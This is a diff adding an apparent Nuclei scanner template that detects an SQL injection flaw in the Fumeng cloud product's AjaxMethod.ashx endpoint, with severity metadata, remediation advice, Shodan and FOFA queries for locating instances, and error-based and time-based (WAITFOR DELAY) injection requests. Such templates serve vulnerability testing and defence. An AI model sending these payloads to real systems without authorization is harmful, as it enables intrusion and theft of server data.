@@ -1,0 +1,70 @@
+id: fumengyun-sqli
+
+info:
+  name: Fumeng - SQL Injection
+  author: ritikchaddha
+  severity: critical
+  description: |
+    The Fumeng AjaxMethod.ashx file has an SQL injection vulnerability. Attackers can use this vulnerability to obtain server data.
+  impact: |
+    Successful exploitation could lead to unauthorized access to sensitive data.
+  remediation: |
+    Implement input validation and use parameterized queries to prevent SQL Injection attacks.
+  reference:
+    - https://github.com/emadshanab/goby-poc/blob/main/fumengyun%20%20AjaxMethod.ashx%20SQL%20injection.json
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-89
+    epss-score: 0.00076
+    epss-percentile: 0.31944
+  metadata:
+    max-request: 1
+    shodan-query: title:"孚盟云 "
+    fofa-query: title="孚盟云 "
+  tags: time-based-sqli,fumasoft,sqli
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(response, "孚盟")'
+        internal: true
+
+  - raw:
+      - |
+        @timeout: 30s
+        GET /Ajax/AjaxMethod.ashx?action=getEmpByname&Name=Y%27 HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        @timeout: 30s
+        GET /Ajax/AjaxMethod.ashx?action=getEmpByname&Name=Y%27;WAITFOR%20DELAY%20%270:0:6%27-- HTTP/1.1
+        Host: {{Hostname}}
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        name: error-based
+        dsl:
+          - 'contains_all(response_1, "SELECT count", "System.Exception:", "WHERE upper")'
+          - 'status_code_1 == 500'
+        condition: and
+
+      - type: dsl
+        name: time-based
+        dsl:
+          - 'duration_2>=6'
+          - 'len(body_2) == 1'
+          - 'regex("^0$", body_2)'
+          - 'contains(content_type_2, "text/plain")'
+        condition: and
+# digest: 490a00463044022100972c6195c7c5308976cef32142fc760f9969e06ce2c9e079fa776b2aca76f80f021f1bfbc997ba70b8abe0d777d30a53a0b8431523cb53a3227f95b731fc7edf11:922c64590222798bb761d5b6d8e72950
